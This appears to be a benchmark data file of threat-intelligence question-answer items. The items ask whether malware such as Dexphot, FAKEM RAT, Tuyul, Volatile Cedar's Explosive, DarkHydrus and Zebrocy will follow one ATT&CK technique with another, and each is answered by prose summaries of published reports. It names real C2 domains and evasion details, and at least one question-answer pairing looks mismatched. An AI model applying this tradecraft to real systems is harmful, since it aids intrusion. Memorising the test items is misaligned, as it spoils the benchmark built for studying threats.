904,218,218-Defense Evasion-T1027-Obfuscated Files or Information,"After ensuring persistence through dual monitoring services and scheduled tasks employing techniques such as Scheduled Task and Signed Binary Proxy Execution, is Dexphot likely to use the SoftwareBundler:Win32/ICLoader to obfuscate its files or information as part of its defense evasion tactics?","Defense Evasion: Dexphot employed multiple layers of security evasion, including the use of SoftwareBundler:Win32/ICLoader to drop and run the installer, living-off-the-land techniques, and obfuscated batch scripts to check for antivirus products. It also used fileless techniques and process hollowing to hide malicious code within legitimate system processes, making detection and remediation difficult.","Execution: The Dexphot attack, first detected in October 2018, involved a complex execution stage where it wrote five key files to disk: an installer with two URLs, an MSI package file, a password-protected ZIP archive, a loader DLL, and an encrypted data file containing three additional executables. These executables were loaded into system processes via process hollowing, targeting legitimate system processes such as msiexec.exe, unzip.exe, rundll32.exe, schtasks.exe, and powershell.exe, and later svchost.exe, tracert.exe, and setup.exe.
Persistence: Dexphot ensured persistence through dual monitoring services that checked the status of all three malicious processes and re-infected the device if any were terminated. It also used schtasks.exe to create scheduled tasks for updates and re-infection, employing techniques like Scheduled Task and Signed Binary Proxy Execution. The tasks called msiexec.exe as a proxy to run the malicious code and updated Dexphot's components upon system reboot and every 90 or 110 minutes while the system was running.
Others: Microsoft Defender ATP Research Team, led by Hazel Kim, closely monitored the Dexphot threat for over a year, observing its evolution and the attackers' efforts to upgrade the malware, target new processes, and work around defensive measures. Microsoft Defender ATP's behavioral blocking and containment capabilities were crucial in stopping the Dexphot campaign. The team's insights into the goals and motivations of Dexphot's authors contributed to a broader understanding of cybercriminal behavior.",Yes,Insights from one year of tracking a polymorphic threat
913,219,219-Command and Control-T1071-Application Layer Protocol,"After disguising its network traffic to look like legitimate protocols such as Windows Messenger and Yahoo! Messenger to evade detection, is it likely that the FAKEM RAT controller will communicate with the compromised computer using encrypted network communication that includes XOR operations for encryption during command and control activities?","Command and Control: The RAT controller communicates with the compromised computer using encrypted network communication. The encryption is done at the bit level, with each byte XOR-ed by every letter in the string, YHCRA, and rotated 3 bits to the right after every XOR operation.","Initial Access: All three versions of the FAKEM RAT were distributed via spear-phishing emails using social engineering to lure targets into executing a malicious attachment. The malicious attachments were often Microsoft Word documents with code that exploits vulnerabilities such as CVE-2010-3333, CVE-2012-0158, and CVE-2009-3129. Some samples were simply executable (.EXE) files.
Persistence: After exploitation, an .EXE file packed with UPX is dropped. The malware copies itself to the %System% folder and adds a registry entry to enable its automatic execution at every system startup.
Defense Evasion: The network traffic the malware produces is designed to look like Windows Messenger traffic. The FAKEM RAT disguises its network traffic to look like various protocols, including Windows Messenger and Yahoo! Messenger traffic, as well as HTML. The network communication is encrypted to ensure that the suspicious data passed between the compromised host and the attackers cannot be easily viewed in plain text.
Collection: The RAT controller issues commands to the compromised computer, which include executing shell commands, browsing directories, accessing running processes, accessing the Windows registry, taking snapshots of the desktop, accessing services, and uploading files from the compromised computer.
Others: The FAKEM RAT infrastructure includes domains such as vcvcvcvc.dyndns.org, zjhao.dtdns.net, avira.suroot.com, *.googmail.com, and freeavg.sytes.net. These domains are used as command-and-control servers for the malware. The research paper by Trend Micro Incorporated highlights the importance of understanding the attack tools, techniques, and infrastructure of adversaries to develop defensive strategies.",Yes,wp-fakem-rat
914,22,22-Initial Access-T1190-Exploit Public-Facing Application,"After exploiting CVE-2017-9841 to gain initial access on unpatched PHPUnit systems, is it likely that the Tuyul malware will execute Perl scripts and shell commands on victim systems before periodically downloading a bash script named 'cron' to maintain persistence?","Initial Access: On January 15, 2020, F5 threat researchers detected a new campaign exploiting a vulnerability in PHPUnit systems (CVE-2017-9841) to install an IRC bot named Tuyul. The malware specifically targets unpatched PHPUnit, a PHP unit testing framework, allowing the attacker to inject arbitrary PHP code on the server.","Execution: The Tuyul botnet, written in Perl, is used to execute commands on victim systems. The malware source code includes functionalities such as promoting bots to higher privilege (pro), demoting bots (noob), updating malware, connecting to reverse shells (bc), executing shell commands (shell), running Perl scripts (perl), and terminating the bot's connection (terminate, suicide).
Persistence: To maintain persistence, the Tuyul malware periodically downloads a bash script named 'cron' to ensure its continued presence on the system. It also includes functionality to detect and terminate processes from other malware infections.
Defense Evasion: The Tuyul malware employs a binary version that goes undetected by antivirus engines, allowing it to operate on the machine without signature-based detection. Additionally, the malware uses various PHP web shells to gain access to servers, including an open-source application called Tiny File Manager and an unknown advanced web shell.
Command and Control: The Tuyul botnet uses the domain irc[.]localroot[.]xyz as its command and control (C&C) server, which hosts the malware files and has a valid SSL certificate. The attacker also maintains two development servers for script development and testing, and for logging successful infections. The C&C server and development servers are protected by Cloudflare.
Others: The Tuyul botnet has possible Indonesian attribution based on several clues, including the time zone set to Asia/Jakarta, the botnet name, admin nicknames, and repository server. The botnet's peak size was 366 victim systems, which is smaller compared to other botnets. The infected servers are primarily hosted on cloud services such as AWS, DigitalOcean, and Linode, with a significant number located in the U.S. and U.K. The botnet's name, Tuyul, refers to a figure in Southeast Asian folklore, particularly Indonesian, which is an undead infant invoked for theft and other crimes. The botnet is actively being worked on and is expected to grow.",Yes,New Perl Botnet (Tuyul) Found with Possible Indonesian Attribution
915,22,22-Execution-T1059-Command and Scripting Interpreter,"After exploiting a vulnerability in PHPUnit systems (CVE-2017-9841) to gain initial access by injecting arbitrary PHP code on the server, is the Tuyul botnet likely to execute commands using Perl scripts before maintaining persistence by periodically downloading a bash script named 'cron' to ensure its continued presence?","Execution: The Tuyul botnet, written in Perl, is used to execute commands on victim systems. The malware source code includes functionalities such as promoting bots to higher privilege (pro), demoting bots (noob), updating malware, connecting to reverse shells (bc), executing shell commands (shell), running Perl scripts (perl), and terminating the bot's connection (terminate, suicide).","Initial Access: On January 15, 2020, F5 threat researchers detected a new campaign exploiting a vulnerability in PHPUnit systems (CVE-2017-9841) to install an IRC bot named Tuyul. The malware specifically targets unpatched PHPUnit, a PHP unit testing framework, allowing the attacker to inject arbitrary PHP code on the server.
Persistence: To maintain persistence, the Tuyul malware periodically downloads a bash script named 'cron' to ensure its continued presence on the system. It also includes functionality to detect and terminate processes from other malware infections.
Defense Evasion: The Tuyul malware employs a binary version that goes undetected by antivirus engines, allowing it to operate on the machine without signature-based detection. Additionally, the malware uses various PHP web shells to gain access to servers, including an open-source application called Tiny File Manager and an unknown advanced web shell.
Command and Control: The Tuyul botnet uses the domain irc[.]localroot[.]xyz as its command and control (C&C) server, which hosts the malware files and has a valid SSL certificate. The attacker also maintains two development servers for script development and testing, and for logging successful infections. The C&C server and development servers are protected by Cloudflare.
Others: The Tuyul botnet has possible Indonesian attribution based on several clues, including the time zone set to Asia/Jakarta, the botnet name, admin nicknames, and repository server. The botnet's peak size was 366 victim systems, which is smaller compared to other botnets. The infected servers are primarily hosted on cloud services such as AWS, DigitalOcean, and Linode, with a significant number located in the U.S. and U.K. The botnet's name, Tuyul, refers to a figure in Southeast Asian folklore, particularly Indonesian, which is an undead infant invoked for theft and other crimes. The botnet is actively being worked on and is expected to grow.",Yes,New Perl Botnet (Tuyul) Found with Possible Indonesian Attribution
921,220,220-Initial Access-T1091-Replication Through Removable Media,"After scanning for and exploiting vulnerabilities on publicly facing web servers to gain initial access, is it likely that the attackers will use the infected servers as a pivot to manually spread to the entire network before employing the Explosive Trojan to achieve lateral movement by infecting connected USB devices?","Initial Access: The modus operandi for this attacker group initially targets publicly facing web servers, with both automatic and manual vulnerability discovery. Once in control of a server, the attackers further penetrate the targeted internal network via various means, including manual online hacking as well as an automated USB infection mechanism.","Reconnaissance: The typical Volatile Cedar attack begins with a vulnerability scan of the target server. Once an exploitable vulnerability is located, it is used to inject a web shell code into the server.
Execution: The Explosive Trojan contains 2 major components: the main executable binary and a DLL file containing backend API calls. The main executable file contains most of the Trojan logic, while the DLL primarily contains exported actionable API functions. The Explosive DLL file is dynamically loaded by the main executable at runtime whenever it is needed, and unloaded when the desired action is complete.
Persistence: Explosive can be installed with various service names, usually with no description value, and under different paths such as %systemroot%, %systemroot%\system32, %systemroot%\SysWOW64, %appdata%, %programfiles%\VMware\VMware Tools, and %programfiles%\Notepad++. During its operation, Explosive uses several other files and directories for tasks such as storing keylog data and other information extracted from the victim's system.
Defense Evasion: The Explosive Trojan goes to great lengths to hide from common detection tools and merge into its surroundings. AV detections are avoided by frequently checking AV results and changing versions and builds on all infected servers when any traces of detection appear. New versions are equipped with a dedicated thread to monitor memory consumption to prevent common server administration utilities from detecting the Explosive processes. API activities which may be considered suspicious are detached from the main logic file and contained in a separate DLL. Custom configurations are set on a per-target basis, including periods of 'radio silence' during which Explosive does not initiate any network communication.
Credential Access: The Explosive Trojan leverages its keylogging capabilities to gain access to administrator passwords entered on the target servers.
Lateral Movement: Evidence shows that the attackers use the initially infected servers as a pivot to manually spread to the entire network. More recent versions of the Explosive Trojan contain a configurable option for USB infection, which infects any writable mass storage device connected to the server.
Command and Control: The campaign uses a multi-tiered server backend framework to control the targeted systems, composed of C&C servers, static update servers, and dynamic update servers. The server framework is diverse, with some servers owned or hosted by the attackers, and others using publicly shared hosting frameworks or compromised legitimate servers.
Others: Malware attribution leads to the suspicion that Volatile Cedar originates from Lebanon. The campaign has been active for almost 3 years, evading detection by the majority of AV products. The attackers select only a handful of targets to avoid unnecessary exposure. New and custom versions are developed, compiled, and deployed specifically for certain targets. The Volatile Cedar target vertical distribution strongly aligns with nation-state/political-group interests, eliminating the possibility of financially motivated attackers.",Yes,volatile-cedar-technical-report
926,220,220-Command and Control-T1071-Application Layer Protocol,"After using the initially infected servers as a pivot to manually spread across the entire network or infect USB devices for lateral movement, is it likely that the Volatile Cedar campaign will leverage a multi-tiered server backend framework for command and control operations through application layer protocols?","Command and Control: The campaign uses a multi-tiered server backend framework to control the targeted systems, composed of C&C servers, static update servers, and dynamic update servers. The server framework is diverse, with some servers owned or hosted by the attackers, and others using publicly shared hosting frameworks or compromised legitimate servers.","Reconnaissance: The typical Volatile Cedar attack begins with a vulnerability scan of the target server. Once an exploitable vulnerability is located, it is used to inject a web shell code into the server.
Initial Access: The modus operandi for this attacker group initially targets publicly facing web servers, with both automatic and manual vulnerability discovery. Once in control of a server, the attackers further penetrate the targeted internal network via various means, including manual online hacking as well as an automated USB infection mechanism.
Execution: The Explosive Trojan contains 2 major components: the main executable binary and a DLL file containing backend API calls. The main executable file contains most of the Trojan logic, while the DLL primarily contains exported actionable API functions. The Explosive DLL file is dynamically loaded by the main executable at runtime whenever it is needed, and unloaded when the desired action is complete.
Persistence: Explosive can be installed with various service names, usually with no description value, and under different paths such as %systemroot%, %systemroot%\system32, %systemroot%\SysWOW64, %appdata%, %programfiles%\VMware\VMware Tools, and %programfiles%\Notepad++. During its operation, Explosive uses several other files and directories for tasks such as storing keylog data and other information extracted from the victim's system.
Defense Evasion: The Explosive Trojan goes to great lengths to hide from common detection tools and merge into its surroundings. AV detections are avoided by frequently checking AV results and changing versions and builds on all infected servers when any traces of detection appear. New versions are equipped with a dedicated thread to monitor memory consumption to prevent common server administration utilities from detecting the Explosive processes. API activities which may be considered suspicious are detached from the main logic file and contained in a separate DLL. Custom configurations are set on a per-target basis, including periods of 'radio silence' during which Explosive does not initiate any network communication.
Credential Access: The Explosive Trojan leverages its keylogging capabilities to gain access to administrator passwords entered on the target servers.
Lateral Movement: Evidence shows that the attackers use the initially infected servers as a pivot to manually spread to the entire network. More recent versions of the Explosive Trojan contain a configurable option for USB infection, which infects any writable mass storage device connected to the server.
Others: Malware attribution leads to the suspicion that Volatile Cedar originates from Lebanon. The campaign has been active for almost 3 years, evading detection by the majority of AV products. The attackers select only a handful of targets to avoid unnecessary exposure. New and custom versions are developed, compiled, and deployed specifically for certain targets. The Volatile Cedar target vertical distribution strongly aligns with nation-state/political-group interests, eliminating the possibility of financially motivated attackers.",Yes,volatile-cedar-technical-report
927,220,220-Command and Control-T1104-Multi-Stage Channels,"After leveraging its keylogging capabilities to extract administrator passwords from the target servers, is it likely that the Volatile Cedar campaign will use a multi-tiered server backend framework, including static and dynamic update servers, for command and control?","Command and Control: The campaign uses a multi-tiered server backend framework to control the targeted systems, composed of C&C servers, static update servers, and dynamic update servers. The server framework is diverse, with some servers owned or hosted by the attackers, and others using publicly shared hosting frameworks or compromised legitimate servers.","Reconnaissance: The typical Volatile Cedar attack begins with a vulnerability scan of the target server. Once an exploitable vulnerability is located, it is used to inject a web shell code into the server.
Initial Access: The modus operandi for this attacker group initially targets publicly facing web servers, with both automatic and manual vulnerability discovery. Once in control of a server, the attackers further penetrate the targeted internal network via various means, including manual online hacking as well as an automated USB infection mechanism.
Execution: The Explosive Trojan contains 2 major components: the main executable binary and a DLL file containing backend API calls. The main executable file contains most of the Trojan logic, while the DLL primarily contains exported actionable API functions. The Explosive DLL file is dynamically loaded by the main executable at runtime whenever it is needed, and unloaded when the desired action is complete.
Persistence: Explosive can be installed with various service names, usually with no description value, and under different paths such as %systemroot%, %systemroot%\system32, %systemroot%\SysWOW64, %appdata%, %programfiles%\VMware\VMware Tools, and %programfiles%\Notepad++. During its operation, Explosive uses several other files and directories for tasks such as storing keylog data and other information extracted from the victim's system.
Defense Evasion: The Explosive Trojan goes to great lengths to hide from common detection tools and merge into its surroundings. AV detections are avoided by frequently checking AV results and changing versions and builds on all infected servers when any traces of detection appear. New versions are equipped with a dedicated thread to monitor memory consumption to prevent common server administration utilities from detecting the Explosive processes. API activities which may be considered suspicious are detached from the main logic file and contained in a separate DLL. Custom configurations are set on a per-target basis, including periods of 'radio silence' during which Explosive does not initiate any network communication.
Credential Access: The Explosive Trojan leverages its keylogging capabilities to gain access to administrator passwords entered on the target servers.
Lateral Movement: Evidence shows that the attackers use the initially infected servers as a pivot to manually spread to the entire network. More recent versions of the Explosive Trojan contain a configurable option for USB infection, which infects any writable mass storage device connected to the server.
Others: Malware attribution leads to the suspicion that Volatile Cedar originates from Lebanon. The campaign has been active for almost 3 years, evading detection by the majority of AV products. The attackers select only a handful of targets to avoid unnecessary exposure. New and custom versions are developed, compiled, and deployed specifically for certain targets. The Volatile Cedar target vertical distribution strongly aligns with nation-state/political-group interests, eliminating the possibility of financially motivated attackers.",Yes,volatile-cedar-technical-report
930,220,220-Lateral Movement-T1091-Replication Through Removable Media,"After leveraging its keylogging capabilities to gain access to administrator passwords during Credential Access, is it likely that the Explosive Trojan will use writable mass storage devices infected through a configurable USB infection option for Lateral Movement before employing a multi-tiered server backend framework for Command and Control?","Lateral Movement: Evidence shows that the attackers use the initially infected servers as a pivot to manually spread to the entire network. More recent versions of the Explosive Trojan contain a configurable option for USB infection, which infects any writable mass storage device connected to the server.","Reconnaissance: The typical Volatile Cedar attack begins with a vulnerability scan of the target server. Once an exploitable vulnerability is located, it is used to inject a web shell code into the server.
Initial Access: The modus operandi for this attacker group initially targets publicly facing web servers, with both automatic and manual vulnerability discovery. Once in control of a server, the attackers further penetrate the targeted internal network via various means, including manual online hacking as well as an automated USB infection mechanism.
Execution: The Explosive Trojan contains 2 major components: the main executable binary and a DLL file containing backend API calls. The main executable file contains most of the Trojan logic, while the DLL primarily contains exported actionable API functions. The Explosive DLL file is dynamically loaded by the main executable at runtime whenever it is needed, and unloaded when the desired action is complete.
Persistence: Explosive can be installed with various service names, usually with no description value, and under different paths such as %systemroot%, %systemroot%\system32, %systemroot%\SysWOW64, %appdata%, %programfiles%\VMware\VMware Tools, and %programfiles%\Notepad++. During its operation, Explosive uses several other files and directories for tasks such as storing keylog data and other information extracted from the victim's system.
Defense Evasion: The Explosive Trojan goes to great lengths to hide from common detection tools and merge into its surroundings. AV detections are avoided by frequently checking AV results and changing versions and builds on all infected servers when any traces of detection appear. New versions are equipped with a dedicated thread to monitor memory consumption to prevent common server administration utilities from detecting the Explosive processes. API activities which may be considered suspicious are detached from the main logic file and contained in a separate DLL. Custom configurations are set on a per-target basis, including periods of 'radio silence' during which Explosive does not initiate any network communication.
Credential Access: The Explosive Trojan leverages its keylogging capabilities to gain access to administrator passwords entered on the target servers.
Command and Control: The campaign uses a multi-tiered server backend framework to control the targeted systems, composed of C&C servers, static update servers, and dynamic update servers. The server framework is diverse, with some servers owned or hosted by the attackers, and others using publicly shared hosting frameworks or compromised legitimate servers.
Others: Malware attribution leads to the suspicion that Volatile Cedar originates from Lebanon. The campaign has been active for almost 3 years, evading detection by the majority of AV products. The attackers select only a handful of targets to avoid unnecessary exposure. New and custom versions are developed, compiled, and deployed specifically for certain targets. The Volatile Cedar target vertical distribution strongly aligns with nation-state/political-group interests, eliminating the possibility of financially motivated attackers.",Yes,volatile-cedar-technical-report
933,221,221-Defense Evasion-T1497-Virtualization/Sandbox Evasion,"After the malicious macro in the bait document (.xlsm) releases and executes the PowerShell script WINDOWSTEMP.ps1, is it likely that the backdoor program will perform checks for virtual machines, sandboxes, or debugging environments before gathering host information through evasion techniques?","Defense Evasion: The backdoor program performed evasion techniques such as checking for virtual machines, sandboxes, and debugging environments to avoid detection.","Initial Access: On January 9, 2019, the 360 Threat Intelligence Center detected multiple bait documents designed for Arabic speakers. These phishing documents were Office Excel files carrying malicious macros. The macros ultimately released and executed a backdoor program written in C# that used complex DNS tunneling techniques to communicate with the C2 server and execute commands. Additionally, the backdoor utilized the Google Drive API for file uploads and downloads.
Execution: The malicious macro code embedded in the bait document, an Office Excel file named "".xlsm"" (indexes.xlsm), was designed to release the WINDOWSTEMP.ps1 and 12-B-366.txt files into the %TEMP% directory. The latter file, which is actually an HTA (HTML Application) file, was used to launch the PowerShell script released earlier. The PowerShell script, WINDOWSTEMP.ps1, decoded and decompressed the content within the script using Base64 and gzip, wrote it to the file %TEMP%\OfficeUpdateService.exe, and then executed %TEMP%\OfficeUpdateService.exe.
Persistence: The backdoor program, after execution, would check for the presence of ""st:off"" and ""pd:off"" parameters. If ""st:off"" was included, it would not write startup items, and if ""pd:off"" was included, it would not release PDF files. It also performed checks for virtual machines, sandboxes, or debugging environments. If these checks were passed, it would execute malicious code and write startup items for persistence.
Discovery: The backdoor program gathered host information after executing evasion techniques.
Command and Control: The backdoor program established communication with the C2 server through DNS tunneling. The communication part was encapsulated in the queryTypesTest function. The command dispatch loop first determined if it was in x_mode; if not, it communicated with the C2 server via DNS tunneling to receive instructions. If in x_mode, it used HTTP for data transmission. The program parsed the data returned from the C2 server, extracted commands, and distributed them through the taskHandler function.
Others: The 360 Threat Intelligence Center, after detailed analysis, associated the attack with the DarkHydrus APT organization, which targets government agencies in the Middle East. The sample used DNS tunneling for communication, similar to malware previously disclosed by Palo Alto. The sandbox detection code and backdoor functionality code were highly consistent with previous findings. A Twitter user with the nickname Steve Williams was linked to the DarkHydrus username, and the nickname Williams was related to the PDB path of the C# written backdoor program. The attackers used Office VBA macros to execute malicious code due to the high cost of exploiting Office 0day vulnerabilities. The 360 Threat Intelligence Center's full product line, including the 360 Threat Intelligence Platform (TIP), SkyEye Advanced Threat Detection System, and 360 NGSOC, now supports precise detection of such attacks.",Yes,darkhydruns-group-against-middle-east-cn
934,221,221-Defense Evasion-T1564-Hide Artifacts,"After executing its payload by decompressing and decoding malicious PowerShell scripts, is the backdoor program likely to gather host information for discovery after checking for virtual machines, sandboxes, and debugging environments to evade detection?","Defense Evasion: The backdoor program performed evasion techniques such as checking for virtual machines, sandboxes, and debugging environments to avoid detection.","Initial Access: On January 9, 2019, the 360 Threat Intelligence Center detected multiple bait documents designed for Arabic speakers. These phishing documents were Office Excel files carrying malicious macros. The macros ultimately released and executed a backdoor program written in C# that used complex DNS tunneling techniques to communicate with the C2 server and execute commands. Additionally, the backdoor utilized the Google Drive API for file uploads and downloads.
Execution: The malicious macro code embedded in the bait document, an Office Excel file named "".xlsm"" (indexes.xlsm), was designed to release the WINDOWSTEMP.ps1 and 12-B-366.txt files into the %TEMP% directory. The latter file, which is actually an HTA (HTML Application) file, was used to launch the PowerShell script released earlier. The PowerShell script, WINDOWSTEMP.ps1, decoded and decompressed the content within the script using Base64 and gzip, wrote it to the file %TEMP%\OfficeUpdateService.exe, and then executed %TEMP%\OfficeUpdateService.exe.
Persistence: The backdoor program, after execution, would check for the presence of ""st:off"" and ""pd:off"" parameters. If ""st:off"" was included, it would not write startup items, and if ""pd:off"" was included, it would not release PDF files. It also performed checks for virtual machines, sandboxes, or debugging environments. If these checks were passed, it would execute malicious code and write startup items for persistence.
Discovery: The backdoor program gathered host information after executing evasion techniques.
Command and Control: The backdoor program established communication with the C2 server through DNS tunneling. The communication part was encapsulated in the queryTypesTest function. The command dispatch loop first determined if it was in x_mode; if not, it communicated with the C2 server via DNS tunneling to receive instructions. If in x_mode, it used HTTP for data transmission. The program parsed the data returned from the C2 server, extracted commands, and distributed them through the taskHandler function.
Others: The 360 Threat Intelligence Center, after detailed analysis, associated the attack with the DarkHydrus APT organization, which targets government agencies in the Middle East. The sample used DNS tunneling for communication, similar to malware previously disclosed by Palo Alto. The sandbox detection code and backdoor functionality code were highly consistent with previous findings. A Twitter user with the nickname Steve Williams was linked to the DarkHydrus username, and the nickname Williams was related to the PDB path of the C# written backdoor program. The attackers used Office VBA macros to execute malicious code due to the high cost of exploiting Office 0day vulnerabilities. The 360 Threat Intelligence Center's full product line, including the 360 Threat Intelligence Platform (TIP), SkyEye Advanced Threat Detection System, and 360 NGSOC, now supports precise detection of such attacks.",Yes,darkhydruns-group-against-middle-east-cn
936,221,221-Command and Control-T1572-Protocol Tunneling,"After gathering host information following successful evasion techniques, is it likely that the backdoor program will establish communication with the C2 server via DNS tunneling and communicate to receive commands?","Command and Control: The backdoor program established communication with the C2 server through DNS tunneling. The communication part was encapsulated in the queryTypesTest function. The command dispatch loop first determined if it was in x_mode; if not, it communicated with the C2 server via DNS tunneling to receive instructions. If in x_mode, it used HTTP for data transmission. The program parsed the data returned from the C2 server, extracted commands, and distributed them through the taskHandler function.","Initial Access: On January 9, 2019, the 360 Threat Intelligence Center detected multiple bait documents designed for Arabic speakers. These phishing documents were Office Excel files carrying malicious macros. The macros ultimately released and executed a backdoor program written in C# that used complex DNS tunneling techniques to communicate with the C2 server and execute commands. Additionally, the backdoor utilized the Google Drive API for file uploads and downloads.
Execution: The malicious macro code embedded in the bait document, an Office Excel file named "".xlsm"" (indexes.xlsm), was designed to release the WINDOWSTEMP.ps1 and 12-B-366.txt files into the %TEMP% directory. The latter file, which is actually an HTA (HTML Application) file, was used to launch the PowerShell script released earlier. The PowerShell script, WINDOWSTEMP.ps1, decoded and decompressed the content within the script using Base64 and gzip, wrote it to the file %TEMP%\OfficeUpdateService.exe, and then executed %TEMP%\OfficeUpdateService.exe.
Persistence: The backdoor program, after execution, would check for the presence of ""st:off"" and ""pd:off"" parameters. If ""st:off"" was included, it would not write startup items, and if ""pd:off"" was included, it would not release PDF files. It also performed checks for virtual machines, sandboxes, or debugging environments. If these checks were passed, it would execute malicious code and write startup items for persistence.
Defense Evasion: The backdoor program performed evasion techniques such as checking for virtual machines, sandboxes, and debugging environments to avoid detection.
Discovery: The backdoor program gathered host information after executing evasion techniques.
Others: The 360 Threat Intelligence Center, after detailed analysis, associated the attack with the DarkHydrus APT organization, which targets government agencies in the Middle East. The sample used DNS tunneling for communication, similar to malware previously disclosed by Palo Alto. The sandbox detection code and backdoor functionality code were highly consistent with previous findings. A Twitter user with the nickname Steve Williams was linked to the DarkHydrus username, and the nickname Williams was related to the PDB path of the C# written backdoor program. The attackers used Office VBA macros to execute malicious code due to the high cost of exploiting Office 0day vulnerabilities. The 360 Threat Intelligence Center's full product line, including the 360 Threat Intelligence Platform (TIP), SkyEye Advanced Threat Detection System, and 360 NGSOC, now supports precise detection of such attacks.",Yes,darkhydruns-group-against-middle-east-cn
937,221,221-Command and Control-T1071-Application Layer Protocol,"After the backdoor program gathers host information during the discovery phase, is it likely to establish communication with the C2 server using DNS tunneling and later parse the returned data, extracting commands from the C2 server before distributing them through the taskHandler function?","Command and Control: The backdoor program established communication with the C2 server through DNS tunneling. The communication part was encapsulated in the queryTypesTest function. The command dispatch loop first determined if it was in x_mode; if not, it communicated with the C2 server via DNS tunneling to receive instructions. If in x_mode, it used HTTP for data transmission. The program parsed the data returned from the C2 server, extracted commands, and distributed them through the taskHandler function.","Initial Access: On January 9, 2019, the 360 Threat Intelligence Center detected multiple bait documents designed for Arabic speakers. These phishing documents were Office Excel files carrying malicious macros. The macros ultimately released and executed a backdoor program written in C# that used complex DNS tunneling techniques to communicate with the C2 server and execute commands. Additionally, the backdoor utilized the Google Drive API for file uploads and downloads.
Execution: The malicious macro code embedded in the bait document, an Office Excel file named "".xlsm"" (indexes.xlsm), was designed to release the WINDOWSTEMP.ps1 and 12-B-366.txt files into the %TEMP% directory. The latter file, which is actually an HTA (HTML Application) file, was used to launch the PowerShell script released earlier. The PowerShell script, WINDOWSTEMP.ps1, decoded and decompressed the content within the script using Base64 and gzip, wrote it to the file %TEMP%\OfficeUpdateService.exe, and then executed %TEMP%\OfficeUpdateService.exe.
Persistence: The backdoor program, after execution, would check for the presence of ""st:off"" and ""pd:off"" parameters. If ""st:off"" was included, it would not write startup items, and if ""pd:off"" was included, it would not release PDF files. It also performed checks for virtual machines, sandboxes, or debugging environments. If these checks were passed, it would execute malicious code and write startup items for persistence.
Defense Evasion: The backdoor program performed evasion techniques such as checking for virtual machines, sandboxes, and debugging environments to avoid detection.
Discovery: The backdoor program gathered host information after executing evasion techniques.
Others: The 360 Threat Intelligence Center, after detailed analysis, associated the attack with the DarkHydrus APT organization, which targets government agencies in the Middle East. The sample used DNS tunneling for communication, similar to malware previously disclosed by Palo Alto. The sandbox detection code and backdoor functionality code were highly consistent with previous findings. A Twitter user with the nickname Steve Williams was linked to the DarkHydrus username, and the nickname Williams was related to the PDB path of the C# written backdoor program. The attackers used Office VBA macros to execute malicious code due to the high cost of exploiting Office 0day vulnerabilities. The 360 Threat Intelligence Center's full product line, including the 360 Threat Intelligence Platform (TIP), SkyEye Advanced Threat Detection System, and 360 NGSOC, now supports precise detection of such attacks.",Yes,darkhydruns-group-against-middle-east-cn
939,222,222-Initial Access-T1566-Phishing,"After the Sednit group performed credential access by using dumpers to retrieve databases of credentials from browsers and email software, is it likely that the operators prepared exfiltration by staging file paths of targeted data before sending it to the encrypted C&C server using hex-encoding?","Initial Access: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, launched a spearphishing email campaign at the end of August 2018, distributing shortened URLs that delivered the first stage of Zebrocy components. The campaign relied on social engineering to lure victims into running the first part of the chain. The URL led to an IP-address-based URL where the archived payload was located, containing an executable file and a decoy PDF document. The executable, when run, would prompt for a password and then open the decoy PDF, while the downloader written in Delphi continued to run in the background.","Execution: The Sednit group's operators took control of the backdoor and began sending commands immediately after the victim executed the downloader. The commands included taking screenshots, gathering system information, network scanning, and executing various system commands to collect data from the victim's computer. The operators used a Stage-1 downloader to download and execute a new downloader, written in C++, which then downloaded a Delphi backdoor. The backdoor's configuration was stored in the resource section, split into four different hex-encoded, encrypted blobs.
Persistence: The operators used COM object hijacking for persistence, adding registry keys for a custom backdoor that was executed using the CMD_EXECUTE command. This backdoor was installed only for a few hours and was removed quickly after its operators completed their tasks.
Defense Evasion: The Sednit group's malware deleted files (binaries and files created) after usage and killed processes to disable security tools.
Credential Access: The operators uploaded and used dumpers on victims' machines to target browsers and versions of Microsoft Outlook from 1997 through 2016. They retrieved databases related to credentials from software such as Firefox, The Bat! email client, and Opera.
Discovery: The operators gathered information about the victim's computer and environment, including registry keys enumeration, listing running processes, and using system commands to gather information about the victim.
Collection: The malware scanned for files matching specific extensions on the local system, network shared drives, and removable media. It staged data by creating a file containing paths of all files to exfiltrate and had features for input capture and screen capture.
Command and Control: The downloaders and backdoors communicated with the C&C server using commonly used ports 80 or 443. Data sent were hex-encoded and encrypted with AES or a custom algorithm. A fallback C&C server was embedded in the configuration.
Exfiltration: Data were automatically prepared with all file paths to retrieve and sent to the C&C server. The data were hex-encoded and encrypted with a known algorithm or a custom one.",Yes,A journey to Zebrocy land
940,222,222-Execution-T1059-Command and Scripting Interpreter,"After distributing Zebrocy components through spearphishing emails to gain initial access, is it likely that the Sednit group’s operators will use a Stage-1 downloader to download and execute a new downloader before employing COM object hijacking for persistence by adding custom registry keys?","Execution: The Sednit group's operators took control of the backdoor and began sending commands immediately after the victim executed the downloader. The commands included taking screenshots, gathering system information, network scanning, and executing various system commands to collect data from the victim's computer. The operators used a Stage-1 downloader to download and execute a new downloader, written in C++, which then downloaded a Delphi backdoor. The backdoor's configuration was stored in the resource section, split into four different hex-encoded, encrypted blobs.","Initial Access: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, launched a spearphishing email campaign at the end of August 2018, distributing shortened URLs that delivered the first stage of Zebrocy components. The campaign relied on social engineering to lure victims into running the first part of the chain. The URL led to an IP-address-based URL where the archived payload was located, containing an executable file and a decoy PDF document. The executable, when run, would prompt for a password and then open the decoy PDF, while the downloader written in Delphi continued to run in the background.
Persistence: The operators used COM object hijacking for persistence, adding registry keys for a custom backdoor that was executed using the CMD_EXECUTE command. This backdoor was installed only for a few hours and was removed quickly after its operators completed their tasks.
Defense Evasion: The Sednit group's malware deleted files (binaries and files created) after usage and killed processes to disable security tools.
Credential Access: The operators uploaded and used dumpers on victims' machines to target browsers and versions of Microsoft Outlook from 1997 through 2016. They retrieved databases related to credentials from software such as Firefox, The Bat! email client, and Opera.
Discovery: The operators gathered information about the victim's computer and environment, including registry keys enumeration, listing running processes, and using system commands to gather information about the victim.
Collection: The malware scanned for files matching specific extensions on the local system, network shared drives, and removable media. It staged data by creating a file containing paths of all files to exfiltrate and had features for input capture and screen capture.
Command and Control: The downloaders and backdoors communicated with the C&C server using commonly used ports 80 or 443. Data sent were hex-encoded and encrypted with AES or a custom algorithm. A fallback C&C server was embedded in the configuration.
